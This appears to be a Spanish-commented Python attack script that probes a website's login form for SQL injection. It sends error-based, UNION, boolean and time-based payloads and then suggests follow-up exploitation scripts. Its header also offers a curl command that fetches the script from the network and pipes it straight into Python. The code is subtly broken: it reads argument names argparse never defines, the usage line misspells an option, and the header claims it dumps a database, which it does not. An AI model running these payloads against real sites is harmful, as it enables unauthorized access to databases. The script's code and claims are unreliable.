#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para usar error-based SQLi para dumpear una base de datos de una URL específica
#
# Ejecución remota con parámetros:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/1-Reconnaissance/Web/LoginForm/SQLiVulnDetector.py | python3 - --utl [URLaComprobar] --userfield ["username"] --passfield ["password"]
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/1-Reconnaissance/Web/LoginForm/SQLiVulnDetector.py | nano -
# ----------

# Requisitos: # python3 -m pip install --user x --break-system-packages

import requests
import time
import argparse

parser = argparse.ArgumentParser(description="Detector de vulnerabilidades SQLi")
parser.add_argument("--url", required=True, help="URL vulnerable (ej: http://10.10.224.12/login)")
parser.add_argument("--userfield", required=True, help="Nombre del campo del usuario (ej: username)")
parser.add_argument("--passfield", required=True, help="Nombre del campo de contraseña (ej: password)")
parser.add_argument("--delay", type=int, default=5, help="Delay para time-based SQLi (default: 5s)")
parser.add_argument("--success", default="Bienvenido", help="Texto que indica login exitoso (boolean-based)")

args = parser.parse_args()

url = args.url
user_field = args.user_field
pass_field = args.pass_field
delay = args.delay
success_word = args.success

headers = {
  "User-Agent": "Mozilla/5.0",
  "Content-Type": "application/x-www-form-urlencoded"
}

def send(data):
  try:
    r = requests.post(url, data=data, headers=headers, timeout=10)
    return r.text
  except Exception as e:
    print(f"[!] Error de conexión: {e}")
    return ""

def test_error_based():
  payload = "' AND updatexml(null,concat(0x7e,database(),0x7e),null) -- -"
  data = {user_field: payload, pass_field: "x"}
  r = send(data)
  return "XPATH syntax error" in r and "~" in r

def test_union_based():
  payload = "' UNION SELECT 1,database(),3 -- -"
  data = {user_field: payload, pass_field: "x"}
  r = send(data)
  return "information_schema" in r or "mysql" in r or "test" in r

def test_boolean_based():
  true_data = {user_field: "' AND 1=1 -- -", pass_field: "x"}
  false_data = {user_field: "' AND 1=0 -- -", pass_field: "x"}
  r_true = send(true_data)
  r_false = send(false_data)
  return (success_word in r_true) and (success_word not in r_false)

def test_time_based():
  payload = f"' AND IF(1=1,SLEEP({delay}),0) -- -"
  data = {user_field: payload, pass_field: "x"}
  t0 = time.time()
  send(data)
  return time.time() - t0 >= delay - 0.5

print("\n Probando vectores de inyección sobre:")
print(f"  URL: {url}")
print(f"  Campo usuario: {user_field}")
print(f"  Campo contraseña: {pass_field}\n")

detected = []

if test_error_based():
  print(" Vulnerable a: Error-based (updatexml)")
  detected.append("error-based")

if test_union_based():
  print(" Vulnerable a: Union-based")
  detected.append("union-based")

if test_boolean_based():
  print(" Vulnerable a: Boolean-based")
  detected.append("boolean-based")

if test_time_based():
  print(" Vulnerable a: Time-based")
  detected.append("time-based")

if not detected:
  print(" No se detectaron vulnerabilidades SQLi comunes.")
else:
  print("\n Puedes usar los siguientes scripts:")
  for tech in detected:
    print(f"  - sqli_{tech.replace('-', '')}.py --url \"{url}\" --userfield \"{user_field}\" --passfield \"{pass_field}\"")
